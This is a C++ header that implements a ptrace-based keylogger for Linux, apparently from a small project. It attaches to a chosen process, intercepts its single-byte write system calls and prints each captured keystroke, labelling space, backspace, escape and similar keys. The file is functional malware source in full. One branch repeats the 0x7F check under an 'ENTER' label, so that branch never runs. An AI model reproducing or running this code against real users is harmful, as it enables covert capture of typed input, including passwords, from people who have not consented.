#ifndef KEYLOGGER_PTRACE_HPP
#define KEYLOGGER_PTRACE_HPP

#include <sys/user.h>
#include <sys/ptrace.h>
#include <wait.h>
#include <sys/syscall.h>

namespace ptrace_ns{
    int read_addr_into_buff(const pid_t pid, const unsigned long long addr, char *buff, unsigned int buff_size){
        unsigned int bytes_read = 0;
        long * read_addr = (long *) addr;
        long * copy_addr = (long *) buff;
        unsigned long ret;
        memset(buff, 0, buff_size);
        do{
            ret = ptrace(PTRACE_PEEKTEXT, pid, (read_addr++), NULL);
            *(copy_addr++) = ret;
            bytes_read += sizeof(long);
        } while (ret && bytes_read < (buff_size - sizeof(long)));
        return bytes_read;
    }

    int ptrace_loop(const uint16_t& _pid){
        int status;
        pid_t pid = _pid;

        printf("[PTRACE] Starting attach pid: %d\n\n", pid);
        if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) return 1;
        if(waitpid(pid, &status, 0) == -1 ) return 1;

        struct user_regs_struct state{};
        ptrace(PTRACE_GETREGS, pid, 0, &state);
        ptrace(PTRACE_SYSCALL, pid, 0, 0);

        char str[1000];
        int flag = 1;
        while(1){
            waitpid(pid, &status, 0);
            if(WIFEXITED(status)) break;
            ptrace(PTRACE_GETREGS, pid, 0, &state);
            if(state.orig_rax == SYS_write  && flag && state.rdx == 1){
                printf("WRITE!!! \n");
                read_addr_into_buff(pid, state.rsi, str, 1000);
                if(str[0] == 0x20) {
                    printf("DATA: %x \n", str[0]);
                    printf("DATA: PROBEL \n");
                }
                else if(str[0] == 0x08) {
                    printf("DATA: %x \n", str[0]);
                    printf("DATA: BACKSPACE \n");
                }
                else if(str[0] == 0x07) {
                    printf("DATA: %x \n", str[0]);
                    printf("DATA: BELL \n");
                }
                else if(str[0] == 0x7F) {
                    printf("DATA: %x \n", str[0]);
                    printf("DATA: DELETE \n");
                }
                else if(str[0] == 0x1B) {
                    printf("DATA: %x \n", str[0]);
                    printf("DATA: ESC \n");
                }
                else if(str[0] == 0x7F) {
                    printf("DATA: %x \n", str[0]);
                    printf("DATA: ENTER \n");
                }
                else {
                    printf("DATA_str: %c \n", str[0]);
                    printf("DATA_oct: %x \n", str[0]);
                }
            }
            flag = !flag;
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
        }
        return 0;
    }
}

#endif //KEYLOGGER_PTRACE_HPP
